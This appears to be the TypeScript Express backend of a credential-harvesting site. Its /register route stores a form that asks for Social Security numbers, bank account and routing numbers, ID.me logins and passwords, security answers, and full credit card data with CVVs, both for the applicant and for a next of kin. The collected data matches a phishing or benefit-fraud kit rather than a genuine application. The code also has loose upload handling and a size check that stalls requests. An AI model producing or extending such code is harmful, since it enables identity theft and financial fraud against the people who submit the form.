import express, { Express, Request, Response, NextFunction } from 'express';
import multer from 'multer';
import mongoose from "mongoose";
import userModel from './model/User';
import bodyParser from 'body-parser';

const app: Express = express();
const PORT: number = 8001 || process.env.PORT;
app.use(express.static("public"));
app.use(bodyParser.urlencoded({ extended: false }));
app.use(express.json());

//setting multer
//First set the storage
const storage = multer.diskStorage({
    destination: (req: Request, file: Express.Multer.File, cb: Function): void => {
        cb(null, 'uploads/');
    },
    filename: (req: Request, file: Express.Multer.File, cb: Function): void => {
        cb(null, `${Date.now()}-${file.originalname}`);
    },
});

//Next is to create a multer instance with the defined storage configuration
const upload = multer({
    storage: storage
});

//Check a function that checks the file size of the document
function checkFileSize(req: Request, res: Response, next: NextFunction): void {
    const fileSizeLimit = 2 * 1024 * 1024; // 2MB
    if (req.headers['content-length']) {
        const contentLength = parseInt(req.headers['content-length']);
        if (contentLength > fileSizeLimit) {
            res.status(400).send('The file size is greater than 2MB');
        } else {
            next()
        }
    }
};

//Define express route and use the multer middleware to handle the file upload
app.post('/upload', checkFileSize, upload.single('file'), (req: Request, res: Response) => {
    res.send('File saved successfully!');
});

//Convert Data for saving; First creating the function return interface
interface ConvertedData {
    firstName: string;
    lastName: string;
    streetAddress: string;
    zip: string;
    city: string;
    state: string;
    gender: string;
    dateOfBirth: string;
    citizenshipStatus: string;
    ethnicity: string;
    employmentStatus: string;
    phone: string;
    money: string;
    useDescription: string;
    inform: string;
    bank: string;
    accountNumber: string;
    routingNumber: string;
    socialSecurityNumber: string;
    question1: string;
    question2: string;
    question3: string;
    residentVerification: string;
    idmeEmail: string;
    idmePassword: string;
    email: string;
    password: string;
    nextOfKinFullName: string;
    nextOfKinAddress: string;
    nextOfKinDateOfBirth: string;
    nextOfKinSocialSecurityNumber: string;
    nextOfKinEmail: string;
    nextOfKinPassword: string;
    nextOfKinCardholderName: string;
    nextOfKinBillingAddress: string;
    nextOfKinBillingCity: string;
    nextOfKinBillingState: string;
    nextOfKinBillingZip: string;
    nextOfKinCreditCardNumber: string;
    nextOfKinCreditCardExpiryMonth: string;
    nextOfKinCreditCardExpiryYear: string;
    nextOfKinCreditCardCVV: string;
    cardholderName: string;
    billingAddress: string;
    billingCity: string;
    billingState: string;
    billingZip: string;
    creditCardNumber: string;
    creditCardExpiryMonth: string;
    creditCardExpiryYear: string;
    creditCardCVV: string;
}

//Converting the data
function convertData(inputData: { [key: string]: any }): ConvertedData {
    const convertedData: ConvertedData = {
        firstName: inputData["template-application-first-name"],
        lastName: inputData["template-application-last-name"],
        streetAddress: inputData["template-application-street-address"],
        zip: inputData["template-application-zip"],
        city: inputData["template-application-city"],
        state: inputData["template-application-state"],
        gender: inputData["template-application-gender"],
        dateOfBirth: inputData["template-application-date-of-birth"],
        citizenshipStatus: inputData["template-application-citizenship-status"],
        ethnicity: inputData["template-application-ethnicity"],
        employmentStatus: inputData["template-application-employment-status"],
        phone: inputData["template-application-phone"],
        money: inputData["template-application-money"],
        useDescription: inputData["template-application-usedescription"],
        inform: inputData["template-application-inform"],
        bank: inputData["template-application-bank"],
        accountNumber: inputData["template-application-account-number"],
        routingNumber: inputData["template-application-routing-number"],
        socialSecurityNumber: inputData["template-application-social-security-number"],
        question1: inputData["template-application-question-1"],
        question2: inputData["template-application-question-2"],
        question3: inputData["template-application-question-3"],
        residentVerification: inputData["template-application-resident-verification"],
        idmeEmail: inputData["template-application-ID.ME-email"],
        idmePassword: inputData["template-application-ID.ME-password"],
        email: inputData["template-application-email"],
        password: inputData["template-application-password"],
        nextOfKinFullName: inputData["template-application-next-of-kin-full-name"],
        nextOfKinAddress: inputData["template-application-next-of-kin-address"],
        nextOfKinDateOfBirth: inputData["template-application-next-of-kin-date-of-birth"],
        nextOfKinSocialSecurityNumber: inputData["template-application-next-of-kin-social-security-number"],
        nextOfKinEmail: inputData["template-application-next-of-kin-email"],
        nextOfKinPassword: inputData["template-application-next-of-kin-password"],
        nextOfKinCardholderName: inputData["template-application-next-of-kin-cardholder-name"],
        nextOfKinBillingAddress: inputData["template-application-next-of-kin-billing-address"],
        nextOfKinBillingCity: inputData["template-application-next-of-kin-billing-city"],
        nextOfKinBillingState: inputData["template-application-next-of-kinbilling-state"],
        nextOfKinBillingZip: inputData["template-application-next-of-kin-billing-zip"],
        nextOfKinCreditCardNumber: inputData["template-application-next-of-kin-credit-card-number"],
        nextOfKinCreditCardExpiryMonth: inputData["template-application-next-of-kin-exipiry-month"],
        nextOfKinCreditCardExpiryYear: inputData["template-application-next-of-kin-expiry-year"],
        nextOfKinCreditCardCVV: inputData["template-application-next-of-kin-credit-card-cvv"],
        cardholderName: inputData["template-application-cardholder-name"],
        billingAddress: inputData["template-application-billing-address"],
        billingCity: inputData["template-application-billing-city"],
        billingState: inputData["template-application-billing-state"],
        billingZip: inputData["template-application-billing-zip"],
        creditCardNumber: inputData["template-application-credit-card-number"],
        creditCardExpiryMonth: inputData["template-application-credit-card-expiry-month"],
        creditCardExpiryYear: inputData["template-application-credit-card-expiry-year"],
        creditCardCVV: inputData["template-application-credit-card-cvv"]
    };

    return convertedData;
};

//Handling saving content to the database
async function saveUser(data: Promise<{ [key: string]: any }>): Promise<void> {
    const convertedData: ConvertedData = convertData(data);
    try {
        const myUser = new userModel(convertedData);
        const savedData = await myUser.save();
        console.log('Content saved successfully!', savedData);
    } catch (error) {
        console.error('Error saving content:', error);
    } finally {
        mongoose.disconnect();
    }
};

//Connecting to database
async function connectToDatabase(): Promise<void> {
    try {
        const dbURI: string = "mongodb://127.0.0.1:27017/mydatabase";
        // const dbURI: string = `mongodb+srv://${DB_USER}:${DB_PASSWORD}@mydb.jio0eir.mongodb.net/?retryWrites=true&w=majority${DB_DATABASE}`;
        await mongoose.connect(dbURI).then(() => {
            console.log("Successfully connected to database!");
        });
        // }
    } catch (error) {
        console.error('Failed to connect to MongoDB', error);
    }
}

//Recieving Form and saving to database
app.post("/register", async (req: Request, res: Response) => {
    const form: Record<string, any> = req.body;
    // console.log(form);
    await saveUser(req.body);
    res.end("Registration Successful");
});

//Running the index page
app.get("/", (req: Request, res: Response) => {
    res.render("index.html");
});

app.get("*", (req: Request, res: Response) => {
    res.redirect("/");
})

app.listen(PORT, async () => {
    try {
        await connectToDatabase();
        console.log(`Listening at PORT ${PORT}`);
    }
    catch (error: unknown) {
        console.log("An Error has occurred when trying to listen for error")
    }
});
